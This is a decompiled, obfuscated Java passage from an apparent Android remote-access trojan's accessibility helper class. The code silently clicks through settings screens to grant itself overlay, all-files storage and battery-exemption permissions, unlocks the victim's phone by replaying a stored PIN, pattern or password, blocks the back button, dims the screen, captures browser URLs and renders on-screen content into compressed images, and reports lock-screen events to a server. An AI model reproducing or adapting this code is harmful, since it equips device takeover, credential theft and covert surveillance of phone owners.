        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        if (Settings.canDrawOverlays((Context)context)) {
            AccessibilityServiceController.FOR_DRAW_OVER = false;
            return;
        }
        Object object2 = UtilityHelper.getLabelApplication(context).toLowerCase();
        Object object3 = AccessibilityServiceHelper.findByTextAndId(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), "android:id/title", (String)object2);
        if (object3 == null) {
            object3 = AccessibilityServiceHelper.findByTextAndClassName(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), "android.widget.TextView", (String)object2);
        }
        if (object3 != null && !bl) {
            object = new Rect();
            object3.getBoundsInScreen(object);
            accessibilityNodeInfo = new Rect();
            jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow().getBoundsInScreen((Rect)accessibilityNodeInfo);
            if (accessibilityNodeInfo.contains(object) && object3.isVisibleToUser()) {
                AccessibilityServiceHelper.clickthis((int)object.exactCenterX(), (int)object.exactCenterY());
                new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda32(context, jhvbzpdwpbqgticwdxuva2), 500L);
                return;
            }
            if (AccessibilityServiceHelper.scrollView(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow())) {
                new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda33(context), 800L);
                return;
            }
            AndroidLogger.Error("scroll", "no");
        }
        if (Settings.canDrawOverlays((Context)context)) {
            AccessibilityServiceController.FOR_DRAW_OVER = false;
        } else {
            boolean bl2;
            block18: {
                bl2 = true;
                accessibilityNodeInfo = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
                if (accessibilityNodeInfo != null) {
                    object = new Rect[]{"android.widget.Switch", "android.widget.CompoundButton", "android.view.View"};
                    if (Build.VERSION.SDK_INT >= 33) {
                        object = new String[]{"android.view.View", "android.widget.Switch", "android.widget.CompoundButton"};
                    }
                    int n = ((String[])object).length;
                    bl2 = true;
                    object3 = object2;
                    block3: for (int i = 0; i < n; ++i) {
                        object2 = object[i];
                        if (!bl2) break;
                        if ((object2 = AccessibilityServiceHelper.getNodesByClassName(accessibilityNodeInfo, (String)object2)) == null || object2.isEmpty()) continue;
                        object2 = object2.iterator();
                        while (object2.hasNext()) {
                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo)object2.next();
                            if (!accessibilityNodeInfo2.isCheckable() || accessibilityNodeInfo2.isChecked()) continue;
                            Log.d((String)"Accessibility", (String)("DrawOver: Found checkable " + accessibilityNodeInfo2.getClassName()));
                            object2 = new Rect();
                            accessibilityNodeInfo2.getBoundsInScreen(object2);
                            AccessibilityServiceHelper.clickthis((int)object2.exactCenterX(), (int)object2.exactCenterY());
                            accessibilityNodeInfo2 = new Handler(Looper.getMainLooper());
                            object2 = new AccessibilityServiceHelper$$ExternalSyntheticLambda1(context, jhvbzpdwpbqgticwdxuva2);
                            accessibilityNodeInfo2.postDelayed((Runnable)object2, 500L);
                            bl2 = false;
                            continue block3;
                        }
                    }
                    if (bl2 && Build.VERSION.SDK_INT >= 35) {
                        object3 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
                        if (object3 == null) break block18;
                        try {
                            if (!object3.isEmpty()) {
                                object3 = (AccessibilityNodeInfo)object3.get(0);
                                object = new Rect();
                                object3.getBoundsInScreen(object);
                                AccessibilityServiceHelper.clickthis((int)object.exactCenterX(), (int)object.exactCenterY());
                                object3 = new Handler(Looper.getMainLooper());
                                object = new AccessibilityServiceHelper$$ExternalSyntheticLambda2(context, jhvbzpdwpbqgticwdxuva2);
                                object3.postDelayed((Runnable)object, 500L);
                                bl2 = false;
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }
            }
            if (bl2) {
                new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda3(jhvbzpdwpbqgticwdxuva2, context), 100L);
            }
        }
    }

    /*
     * WARNING - combined exceptions agressively - possible behaviour change.
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void EnableExtraStrg(int n) {
        block22: {
            int n2;
            Object object422;
            Object object2;
            AccessibilityNodeInfo accessibilityNodeInfo;
            int n3;
            AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
            block24: {
                Object object3;
                jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
                if (jhvbzpdwpbqgticwdxuva2 == null) {
                    return;
                }
                if (Build.VERSION.SDK_INT < 30) break block22;
                if (Environment.isExternalStorageManager()) {
                    AccessibilityServiceController.FOR_EXTR_STRG = false;
                    break block22;
                }
                n3 = 0;
                accessibilityNodeInfo = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
                if (accessibilityNodeInfo == null) {
                    return;
                }
                object2 = new String[]{"android.widget.Switch", "android.widget.CompoundButton", "android.view.View"};
                if (Build.VERSION.SDK_INT >= 33) {
                    object2 = new String[]{"android.view.View", "android.widget.Switch", "android.widget.CompoundButton"};
                }
                for (Object object422 : object2) {
                    block23: {
                        if (n3 != 0) break;
                        object422 = AccessibilityServiceHelper.getNodesByClassName(accessibilityNodeInfo, (String)object422);
                        n2 = n3;
                        if (object422 != null) {
                            if (object422.isEmpty()) {
                                n2 = n3;
                            } else {
                                object3 = object422.iterator();
                                do {
                                    n2 = n3;
                                    if (!object3.hasNext()) break block23;
                                } while (!(object422 = (AccessibilityNodeInfo)object3.next()).isCheckable() || object422.isChecked());
                                object3 = new StringBuilder();
                                Log.d((String)"Accessibility", (String)((StringBuilder)object3).append("ExtraStrg: Found checkable ").append((Object)object422.getClassName()).toString());
                                object3 = new Rect();
                                object422.getBoundsInScreen((Rect)object3);
                                AccessibilityServiceHelper.clickthis((int)object3.exactCenterX(), (int)object3.exactCenterY());
                                object422 = new Handler(Looper.getMainLooper());
                                object3 = new AccessibilityServiceHelper$$ExternalSyntheticLambda23(jhvbzpdwpbqgticwdxuva2);
                                object422.postDelayed((Runnable)object3, 350L);
                                n2 = 1;
                            }
                        }
                    }
                    n3 = n2;
                }
                n2 = n3;
                if (n3 == 0) {
                    n2 = n3;
                    if (Build.VERSION.SDK_INT >= 35) {
                        object2 = AccessibilityServiceHelper.getNodesByClassName(accessibilityNodeInfo, "android.view.View");
                        n2 = n3;
                        if (object2 != null) {
                            AccessibilityNodeInfo accessibilityNodeInfo2;
                            Iterator iterator2 = object2.iterator();
                            while (true) {
                                n2 = n3;
                                if (!iterator2.hasNext()) break block24;
                                accessibilityNodeInfo2 = (AccessibilityNodeInfo)iterator2.next();
                                if (!accessibilityNodeInfo2.isClickable() || !accessibilityNodeInfo2.isEnabled()) continue;
                                object2 = accessibilityNodeInfo2.getContentDescription();
                                object422 = accessibilityNodeInfo2.getText();
                                StringBuilder stringBuilder = new StringBuilder();
                                object3 = "";
                                if (object2 == null) {
                                    object2 = "";
                                }
                                stringBuilder = stringBuilder.append(object2).append(" ");
                                object2 = object3;
                                if (object422 != null) {
                                    object2 = object422;
                                }
                                if (((String)(object2 = stringBuilder.append(object2).toString().toLowerCase())).contains("switch") || ((String)object2).contains("toggle") || ((String)object2).contains("\u043f\u0435\u0440\u0435\u043a\u043b\u044e\u0447\u0430\u0442\u0435\u043b\u044c") || ((String)object2).contains("\u0432\u043a\u043b\u044e\u0447\u0438\u0442\u044c")) break;
                            }
                            object2 = new Rect();
                            accessibilityNodeInfo2.getBoundsInScreen((Rect)object2);
                            AccessibilityServiceHelper.clickthis((int)object2.exactCenterX(), (int)object2.exactCenterY());
                            object2 = new Handler(Looper.getMainLooper());
                            object422 = new AccessibilityServiceHelper$$ExternalSyntheticLambda24(jhvbzpdwpbqgticwdxuva2);
                            object2.postDelayed((Runnable)object422, 350L);
                            n2 = 1;
                        }
                    }
                }
            }
            if (n2 != 0 || (n3 = Build.VERSION.SDK_INT) < 35) break block22;
            try {
                object2 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
                if (object2 != null && !object2.isEmpty()) {
                    object422 = (AccessibilityNodeInfo)object2.get(0);
                    object2 = new Rect();
                    object422.getBoundsInScreen((Rect)object2);
                    AccessibilityServiceHelper.clickthis((int)object2.exactCenterX(), (int)object2.exactCenterY());
                    object2 = new Handler(Looper.getMainLooper());
                    object422 = new AccessibilityServiceHelper$$ExternalSyntheticLambda25(jhvbzpdwpbqgticwdxuva2);
                    object2.postDelayed((Runnable)object422, 350L);
                }
                break block22;
            }
            catch (Exception exception) {}
            break block22;
            catch (Exception exception) {
                AndroidLogger.Error("FOR_EXTR_STRG", exception.getMessage());
            }
        }
        if (Build.VERSION.SDK_INT < 30) return;
        if (Environment.isExternalStorageManager()) {
            AccessibilityServiceController.FOR_EXTR_STRG = false;
            return;
        }
        if (n >= 3) return;
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda26(n), 1000L);
    }

    public static String EtypetoStr(int n) {
        switch (n) {
            default: {
                return "Extra";
            }
            case 8192: {
                return "Selection Changed";
            }
            case 4096: {
                return "Scroll";
            }
            case 256: {
                return "Hover Exit";
            }
            case 128: {
                return "Hover Enter";
            }
            case 64: {
                return "Notifications";
            }
            case 32: {
                return "Window Change";
            }
            case 16: {
                return "Text Change";
            }
            case 8: {
                return "Focus";
            }
            case 4: {
                return "Select";
            }
            case 2: {
                return "Long Click";
            }
            case 1: 
        }
        return "Click";
    }

    public static void GoHome() {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 != null) {
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(2);
        }
    }

    public static void LockScreen() {
        if (WorkerService.My_Access_inst != null) {
            WorkerService.My_Access_inst.performGlobalAction(Integer.valueOf("8"));
        }
    }

    /*
     * Enabled aggressive block sorting
     */
    public static void Navitageto(String string2) {
        int n;
        Context context;
        block13: {
            if (WorkerService.My_Access_inst == null) {
                return;
            }
            context = AccessibilityServiceHelper.mycontext();
            if (context == null) {
                return;
            }
            switch (string2.hashCode()) {
                case 112784: {
                    if (!string2.equals("rec")) break;
                    n = 1;
                    break block13;
                }
                case 97292: {
                    if (!string2.equals("bak")) break;
                    n = 2;
                    break block13;
                }
                case 3335: {
                    if (!string2.equals("ho")) break;
                    n = 0;
                    break block13;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return;
            }
            case 2: {
                WorkerService.My_Access_inst.performGlobalAction(1);
                return;
            }
            case 1: {
                WorkerService.My_Access_inst.performGlobalAction(3);
                return;
            }
            case 0: 
        }
        if (!UtilityHelper.IsScreenOn(context)) {
            AccessibilityServiceHelper.WakeScreen(null);
        }
        WorkerService.My_Access_inst.performGlobalAction(2);
    }

    public static void Removename(String string2) {
        if (Map_Name_Lnk.containsKey(string2)) {
            Map_Name_Lnk.remove(string2);
        }
        if (Map_Name_ID.containsKey(string2)) {
            Map_Name_ID.remove(string2);
        }
        if (TNames.contains(string2)) {
            TNames.remove(string2);
        }
    }

    /*
     * WARNING - combined exceptions agressively - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static void Treger(String string2, String[] accessibilityManager) {
        try {
            AccessibilityManager accessibilityManager2;
            AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 == null) {
                return;
            }
            Context context = AccessibilityServiceHelper.mycontext();
            if (context == null) {
                return;
            }
            if (accessibilityManager != null) {
                accessibilityManager2 = accessibilityManager[0];
                accessibilityManager = accessibilityManager[1];
                if (!AccessibilityServiceController.CommandsData.containsKey("") || !AccessibilityServiceController.CommandsData.containsValue("")) {
                    AccessibilityServiceController.CommandsData.put((String)accessibilityManager2, (String)accessibilityManager);
                }
            }
            if (!(accessibilityManager = (AccessibilityManager)context.getSystemService("accessibility")).isEnabled()) return;
            accessibilityManager2 = AccessibilityEvent.obtain();
            accessibilityManager2.setEventType(16384);
            accessibilityManager2.setClassName((CharSequence)((Object)((Object)jhvbzpdwpbqgticwdxuva2)).getClass().getName());
            accessibilityManager2.setPackageName((CharSequence)context.getPackageName());
            accessibilityManager2.getText().add(string2);
            accessibilityManager.sendAccessibilityEvent((AccessibilityEvent)accessibilityManager2);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static void UnlockScreen() {
        boolean bl;
        int n;
        String[] stringArray;
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        Context context;
        block22: {
            context = AccessibilityServiceHelper.mycontext();
            if (context == null) {
                return;
            }
            jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 == null) {
                return;
            }
            if (!((KeyguardManager)context.getSystemService("keyguard")).isKeyguardLocked()) return;
            AccessibilityServiceController.skiprecord = true;
            AccessibilityServiceHelper.WakeScreen(null);
            jhvbzpdwpbqgticwdxuva2.disablesuperwatch();
            try {
                Thread.sleep(800L);
            }
            catch (Exception exception) {
                // empty catch block
            }
            AccessibilityServiceHelper.clickthis(100, 100);
            try {
                Thread.sleep(800L);
            }
            catch (Exception exception) {
                // empty catch block
            }
            AccessibilityServiceHelper.slideUp();
            try {
                Thread.sleep(2500L);
            }
            catch (Exception exception) {
                // empty catch block
            }
            AccessibilityServiceController.CapOK = false;
            stringArray = SharedPreferencesManager.Read((Context)jhvbzpdwpbqgticwdxuva2, ConfigurationConstants.mob_lock, "x:x:x").split(":");
            String string2 = stringArray[0];
            switch (string2.hashCode()) {
                case 3588: {
                    if (!string2.equals("pt")) break;
                    n = 1;
                    break block22;
                }
                case 3577: {
                    if (!string2.equals("pi")) break;
                    n = 2;
                    break block22;
                }
                case 3569: {
                    if (!string2.equals("pa")) break;
                    n = 0;
                    break block22;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                AccessibilityServiceController.skiprecord = false;
                WorkerService.MyWorker.AlertServer(context, "Lock Screen", "Unknown");
                return;
            }
            case 2: {
                boolean bl2;
                boolean bl3 = bl2 = false;
                if (stringArray.length >= 3) {
                    bl3 = bl2;
                    if (stringArray[2].equals("E")) {
                        bl3 = true;
                    }
                }
                AccessibilityServiceController.drawPin(stringArray[1], bl3);
                return;
            }
            case 1: {
                jhvbzpdwpbqgticwdxuva2.drawPattern(stringArray[1]);
                return;
            }
            case 0: 
        }
        boolean bl4 = bl = false;
        if (stringArray.length >= 3) {
            bl4 = bl;
            if (stringArray[2].equals("E")) {
                bl4 = true;
            }
        }
        jhvbzpdwpbqgticwdxuva2.Unlockpass(stringArray[1], bl4);
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static void WakeScreen(Context object) {
        Exception exception2;
        block11: {
            Object object2;
            block12: {
                object2 = object;
                if (object == null) {
                    try {
                        object2 = AccessibilityServiceHelper.mycontext();
                    }
                    catch (Exception exception2) {
                        break block11;
                    }
                }
                if (object2 == null) {
                    return;
                }
                try {
                    object = new Intent((Context)object2, WakeLockActivity.class);
                    object.addFlags(0x10000000);
                    object.addFlags(0x800000);
                    object.addFlags(32768);
                    object.addFlags(0x4000000);
                    object2.startActivity((Intent)object);
                }
                catch (Exception exception3) {
                    // empty catch block
                }
                {
                    object = (PowerManager)object2.getSystemService("power");
                    if (wakelights != null) break block12;
                    wakelights = object.newWakeLock(805306394, ":");
                }
            }
            try {
                boolean bl = wakelights.isHeld();
                if (bl) {
                    return;
                }
            }
            catch (Exception exception4) {
                // empty catch block
            }
            {
                object = new Runnable(){

                    @Override
                    public void run() {
                        try {
                            if (!wakelights.isHeld()) {
                                wakelights.acquire();
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        try {
                            Thread.sleep(15000L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        try {
                            if (wakelights.isHeld()) {
                                wakelights.release();
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                };
                object2 = new Thread((Runnable)object);
                ((Thread)object2).start();
                return;
            }
        }
        exception2.printStackTrace();
    }

    public static void addOverlay(Context context) {
        if (!Settings.canDrawOverlays((Context)context)) {
            return;
        }
        WindowManager windowManager = (WindowManager)context.getSystemService("window");
        SurfaceView surfaceView = new SurfaceView(context);
        surfaceView.setBackgroundColor(Color.parseColor((String)"#00000001"));
        surfaceView.setFocusable(true);
        surfaceView.setClickable(true);
        int n = Build.VERSION.SDK_INT >= 26 ? 2038 : 2003;
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(8, 8, n, 552, -3);
        layoutParams.gravity = 0x800033;
        layoutParams.x = 8;
        layoutParams.y = 8;
        windowManager.addView((View)surfaceView, (ViewGroup.LayoutParams)layoutParams);
        surfaceView.setVisibility(0);
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda10(surfaceView, context), 3000L);
    }

    public static void adjustVolume(boolean bl) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        if ((jhvbzpdwpbqgticwdxuva2 = (AudioManager)jhvbzpdwpbqgticwdxuva2.getSystemService("audio")) != null) {
            int n = bl ? 1 : -1;
            jhvbzpdwpbqgticwdxuva2.adjustStreamVolume(3, n, 0);
            jhvbzpdwpbqgticwdxuva2.adjustStreamVolume(2, n, 1);
            jhvbzpdwpbqgticwdxuva2.adjustStreamVolume(1, n, 0);
            jhvbzpdwpbqgticwdxuva2.adjustStreamVolume(5, n, 0);
        }
    }

    public static void blockBack() {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block5: {
            try {
                jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
                if (jhvbzpdwpbqgticwdxuva2 != null) break block5;
                return;
            }
            catch (Exception exception) {
                AndroidLogger.Error("blockBack", exception.getMessage());
            }
        }
        for (int i = 0; i <= 4; ++i) {
            try {
                jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
                continue;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    public static String captureUrl(AccessibilityNodeInfo object, Supported_Browsers supported_Browsers) {
        if ((object = object.findAccessibilityNodeInfosByViewId(supported_Browsers.id)) != null && object.size() > 0) {
            supported_Browsers = (AccessibilityNodeInfo)object.get(0);
            if (supported_Browsers == null) {
                return null;
            }
            object = null;
            if (supported_Browsers.getText() != null) {
                object = ((Object)supported_Browsers.getText()).toString();
            }
            supported_Browsers.recycle();
            return object;
        }
        return null;
    }

    public static boolean clickAllText(String string2, AccessibilityNodeInfo accessibilityNodeInfo, Context context) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        boolean bl = false;
        int n = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < n; ++i) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(i);
            if (accessibilityNodeInfo2 == null) continue;
            CharSequence charSequence = accessibilityNodeInfo2.getText();
            boolean bl2 = bl;
            if (charSequence != null) {
                bl2 = bl;
                if (((Object)charSequence).toString().equalsIgnoreCase(string2)) {
                    charSequence = new Rect();
                    accessibilityNodeInfo2.getBoundsInScreen((Rect)charSequence);
                    AccessibilityServiceHelper.clickthis(charSequence.centerX(), charSequence.centerY());
                    bl2 = true;
                }
            }
            bl = bl2;
            if (accessibilityNodeInfo2.getChildCount() > 0) {
                bl = bl2;
                if (AccessibilityServiceHelper.clickAllText(string2, accessibilityNodeInfo2, context)) {
                    bl = true;
                }
            }
            accessibilityNodeInfo2.recycle();
        }
        return bl;
    }

    public static boolean clickscr(int n, int n2, int n3) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block3: {
            try {
                jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
                if (jhvbzpdwpbqgticwdxuva2 != null) break block3;
                return false;
            }
            catch (Exception exception) {
                exception.printStackTrace();
                return false;
            }
        }
        Path path2 = new Path();
        path2.moveTo((float)n, (float)n2);
        GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path2, 0L, (long)n3);
        path2 = new GestureDescription.Builder();
        path2.addStroke(strokeDescription);
        AccessibilityServiceHelper.smartDispatch(jhvbzpdwpbqgticwdxuva2, path2.build(), null);
        return true;
    }

    public static boolean clickthis(int n, int n2) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block3: {
            try {
                jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
                if (jhvbzpdwpbqgticwdxuva2 != null) break block3;
                return false;
            }
            catch (Exception exception) {
                exception.printStackTrace();
                return false;
            }
        }
        Path path2 = new Path();
        path2.moveTo((float)n, (float)n2);
        GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path2, 0L, 1L);
        path2 = new GestureDescription.Builder();
        path2.addStroke(strokeDescription);
        AccessibilityServiceHelper.smartDispatch(jhvbzpdwpbqgticwdxuva2, path2.build(), null);
        return true;
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     */
    private static void clikbtry(Context object) {
        void var0_13;
        void var0_9;
        int n;
        String string2;
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block23: {
            if (UtilityHelper.IsIgnore_Battery(object)) {
                AccessibilityServiceController.forbattery = false;
                return;
            }
            jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 == null) {
                return;
            }
            string2 = Locale.getDefault().getLanguage();
            String string3 = "No restrictions";
            switch (string2.hashCode()) {
                case 3886: {
                    if (!string2.equals("zh")) break;
                    n = 2;
                    break block23;
                }
                case 3710: {
                    if (!string2.equals("tr")) break;
                    n = 3;
                    break block23;
                }
                case 3651: {
                    if (!string2.equals("ru")) break;
                    n = 5;
                    break block23;
                }
                case 3588: {
                    if (!string2.equals("pt")) break;
                    n = 4;
                    break block23;
                }
                case 3246: {
                    if (!string2.equals("es")) break;
                    n = 6;
                    break block23;
                }
                case 3241: {
                    if (!string2.equals("en")) break;
                    n = 0;
                    break block23;
                }
                case 3121: {
                    if (!string2.equals("ar")) break;
                    n = 1;
                    break block23;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                AccessibilityServiceController.forbattery = false;
                break;
            }
            case 6: {
                String string4 = "Sin restricciones";
                break;
            }
            case 5: {
                String string5 = "\u041d\u0435\u0442 \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0439";
                break;
            }
            case 4: {
                String string6 = "Nenhuma restri\u00e7\u00e3o";
                break;
            }
            case 3: {
                String string7 = "K\u0131s\u0131tlama yok";
                break;
            }
            case 2: {
                String string8 = "\u65e0\u9650\u5236";
                break;
            }
            case 1: {
                String string9 = "\u0644\u0627 \u062a\u0648\u062c\u062f \u0642\u064a\u0648\u062f";
                break;
            }
            case 0: {
                String string10 = "No restrictions";
            }
        }
        string2 = null;
        List<AccessibilityNodeInfo> list = AccessibilityServiceHelper.findNodesByText((String)var0_9, jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow());
        String string11 = string2;
        if (list != null) {
            String string12 = string2;
            if (!list.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo = list.get(0);
            }
        }
        if (var0_13 != null) {
            string2 = new Rect();
            var0_13.getBoundsInScreen((Rect)string2);
            AccessibilityServiceHelper.clickthis(string2.centerX(), string2.centerY());
            AccessibilityServiceController.forbattery = false;
        }
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static byte[] compressBitmap(Bitmap bitmap) {
        Throwable throwable422222;
        block10: {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Object object = Bitmap.createScaledBitmap((Bitmap)bitmap, (int)480, (int)720, (boolean)true);
            object.compress(Bitmap.CompressFormat.WEBP, 80, (OutputStream)byteArrayOutputStream);
            object.recycle();
            object = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();
            bitmap.recycle();
            return object;
            catch (Throwable throwable2) {
                try {
                    byteArrayOutputStream.close();
                    throw throwable2;
                }
                catch (Throwable throwable3) {
                    try {
                        throwable2.addSuppressed(throwable3);
                        throw throwable2;
                    }
                    catch (Throwable throwable422222) {
                        break block10;
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                        bitmap.recycle();
                        return null;
                    }
                }
            }
        }
        bitmap.recycle();
        throw throwable422222;
    }

    public static byte[] createskilton() {
        Object object;
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block7: {
            block6: {
                block5: {
                    try {
                        jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
                        if (jhvbzpdwpbqgticwdxuva2 != null) break block5;
                        return null;
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                        return null;
                    }
                }
                object = AccessibilityServiceHelper.mycontext();
                if (object != null) break block6;
                return null;
            }
            jhvbzpdwpbqgticwdxuva2 = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
            if (jhvbzpdwpbqgticwdxuva2 != null) break block7;
            return null;
        }
        Display display = AccessibilityServiceController.AccessWindow.getDefaultDisplay();
        Point point = new Point();
        display.getRealSize(point);
        Bitmap bitmap = Bitmap.createBitmap((int)point.x, (int)point.y, (Bitmap.Config)Bitmap.Config.ARGB_8888);
        point = new Canvas(bitmap);
        display = new Paint();
        point.drawColor(0, PorterDuff.Mode.CLEAR);
        AccessibilityServiceHelper.processNode((AccessibilityNodeInfo)jhvbzpdwpbqgticwdxuva2, (Canvas)point, (Paint)display, object);
        object = AccessibilityServiceHelper.compressBitmap(bitmap);
        return object;
    }

    private static void dimBrightness(Context context) {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            savedBrightnessMode = Settings.System.getInt((ContentResolver)contentResolver, (String)"screen_brightness_mode", (int)-1);
            savedBrightness = Settings.System.getInt((ContentResolver)contentResolver, (String)"screen_brightness", (int)-1);
            if (Settings.System.canWrite((Context)context)) {
                Settings.System.putInt((ContentResolver)contentResolver, (String)"screen_brightness_mode", (int)0);
                Settings.System.putInt((ContentResolver)contentResolver, (String)"screen_brightness", (int)0);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            AccessibilityServiceController.Blacklayparams.screenBrightness = 0.0f;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void disply(Context context) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        if (UtilityHelper.isAppDisabled(context, "com.android.vending")) {
            AccessibilityServiceController.FOR_PLY = false;
            try {
                jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
            }
            catch (Exception exception) {
                // empty catch block
            }
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda7(jhvbzpdwpbqgticwdxuva2, context), 800L);
    }

    private static void drawNode(Canvas canvas, Paint paint, Rect rect, String string2, int n) {
        paint.setColor(n);
        paint.setStyle(Paint.Style.STROKE);
        paint.setStrokeWidth(2.0f);
        canvas.drawRect(rect, paint);
        paint.setStyle(Paint.Style.FILL);
        paint.setTextSize((float)AccessibilityServiceController.screenfontSize);
        paint.setAntiAlias(true);
        paint.setTypeface(Typeface.SANS_SERIF);
        paint.setTextAlign(Paint.Align.LEFT);
        n = rect.left;
        int n2 = rect.centerY();
        int n3 = (int)((paint.descent() + paint.ascent()) / 2.0f);
        canvas.drawText(string2, (float)n, (float)(n2 - n3), paint);
    }

    private static void drawViewHierarchy(Canvas canvas, AccessibilityNodeInfo accessibilityNodeInfo, Paint paint, int n) {
        block3: {
            if (accessibilityNodeInfo == null || accessibilityNodeInfo.getChildCount() == 0) break block3;
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
                String string2;
                Rect rect;
                AccessibilityNodeInfo accessibilityNodeInfo2;
                block5: {
                    block4: {
                        accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(i);
                        if (accessibilityNodeInfo2 == null || !accessibilityNodeInfo2.isVisibleToUser()) continue;
                        rect = new Rect();
                        accessibilityNodeInfo2.getBoundsInScreen(rect);
                        String string3 = AccessibilityServiceHelper.extractText(accessibilityNodeInfo2);
                        if (string3 == null) break block4;
                        string2 = string3;
                        if (!string3.isEmpty()) break block5;
                    }
                    string2 = "\u2022";
                }
                paint.setColor(n);
                paint.setTextSize((float)AccessibilityServiceController.screenfontSize);
                AccessibilityServiceHelper.drawNode(canvas, paint, rect, string2, n);
                AccessibilityServiceHelper.drawViewHierarchy(canvas, accessibilityNodeInfo2, paint, n);
                accessibilityNodeInfo2.recycle();
            }
            return;
        }
    }

    private static String extractText(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string2;
        if (accessibilityNodeInfo == null) {
            return null;
        }
        if (accessibilityNodeInfo.getText() != null) {
            return ((Object)accessibilityNodeInfo.getText()).toString();
        }
